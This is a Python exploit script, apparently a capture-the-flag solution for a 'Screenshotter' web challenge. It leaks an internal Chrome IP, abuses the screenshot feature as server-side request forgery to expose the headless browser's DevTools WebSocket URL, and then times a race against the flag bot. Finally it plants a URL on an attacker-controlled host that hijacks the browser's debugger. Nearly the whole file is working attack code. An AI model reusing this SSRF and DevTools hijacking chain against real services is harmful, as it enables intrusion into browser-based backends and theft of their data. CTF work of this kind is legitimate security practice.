# !/usr/bin/env python3
# -*- coding: utf-8 -*-

# built-in imports
# import re
import sys
import time
import base64
from datetime import datetime

# third-party imports
import requests
# import pytesseract
from loguru import logger


SCREENSHOTTER = 'http://192.168.200.130:5000'
ATTACKER = '192.168.1.9:8000'


def getChromeIP(s: requests.Session, u: str, p: str) -> str:
    s.post(f'{SCREENSHOTTER}/registerlogin', data={'username': u, 'password': p})

    CHROME_IP = None
    while not CHROME_IP:
        js = s.get(f'{SCREENSHOTTER}/activity.json').json()
        for j in js:
            logger.info(j['msg'])
            if 'chrome:' in j['msg']:
                CHROME_IP = base64.b64decode(j['msg'].split('chrome:')[1] + "===").decode('ascii')

    return CHROME_IP


def getWebSocketDebuggerUrl(s: requests.Session, chrome: str) -> str | None:
    logger.info('post leak shot!')
    s.post(f'{SCREENSHOTTER}/add_note', data={
        'body': f'http://cscg.de@{chrome}:9222/json/version',
        'title': ''
    })

    GOT_SCREENSHOT = False
    while not GOT_SCREENSHOT:

        js = s.get(f'{SCREENSHOTTER}/notes.json').json()
        j = js[0]
        if "processing screenshot..." not in j['title']:
            logger.info('found screenshot')
            screenshot = base64.b64decode(j['data'].split('data:image/png;base64,')[1])
            with open('shot.png', 'wb') as f:
                f.write(screenshot)
            # try:
            #     # 精度太差可以下个 https://github.com/tesseract-ocr/tessdata/blob/main/eng.traineddata 试试
            #     GOT_SCREENSHOT = pytesseract.image_to_string('shot.png', lang='eng')
            #     GOT_SCREENSHOT = GOT_SCREENSHOT.replace("\n", "").replace("\r", "")
            # except pytesseract.TesseractNotFoundError:
            #     logger.error("tesseract is not installed or it's not in your PATH.")
            #     logger.error("please refer https://github.com/UB-Mannheim/tesseract/wiki")
            #     sys.exit(0)
            break
        logger.info(f"waiting for screenshot: `{j['title']}`")
        time.sleep(1)

    # r = re.compile('([a-f0-9]{8}-)([a-f0-9]{4}-){3}([a-f0-9]{12})')
    # logger.info(f"OCR the screenshot: `{GOT_SCREENSHOT}`")
    # ws = r.search(GOT_SCREENSHOT)

    # OCR 的成功率实在太低了, 手动输入 WebsocketUrl 吧
    # 反正微信也可以提取文字了, 直接复制图片到微信 Extract Text 都比这 OCR 好用
    ws = input('Please input WebsocketUrl: ')

    logger.info(f'got ws? {ws}')
    # return None if ws is None else ws.group(0)
    return ws


def trigger_exploit(s: requests.Session, target: str) -> None:
    GOOD_TIME = False
    while not GOOD_TIME:
        js = s.get(f'{SCREENSHOTTER}/activity.json').json()
        j = js[0]
        if 'flagger deleted a note' in j['msg']:
            now = datetime.utcnow()
            diff = now - datetime.strptime(j['timestamp'], '%Y-%m-%d %H:%M:%S')
            if diff.seconds < 3:
                GOOD_TIME = True
                break
        logger.info(f"waiting for the right moment: `{j['msg']}`")
        time.sleep(1)
    
    logger.info('saw trigger. now wait 30s')
    time.sleep(30)

    s.post(f'{SCREENSHOTTER}/add_note', data={'body': target, 'title': ''})
    logger.info(f'attach target: {target}')
    logger.info('triggered attack!')


def main():
    logger.info('SCREENSHOTTER EXPLOIT')
    s = requests.Session()

    chrome_ip = getChromeIP(s, 'test', 'test')
    logger.info(f'Got chrome IP: {chrome_ip}')

    browser_ws = getWebSocketDebuggerUrl(s, chrome_ip)

    if browser_ws is None:
        logger.error("couldn't find ws ID")
        sys.exit(0)

    attach_target = f"http://cscg.de@{ATTACKER}/websocket.html?{chrome_ip},{browser_ws},{ATTACKER}"
    trigger_exploit(s, attach_target)


if __name__ == '__main__':
    main()
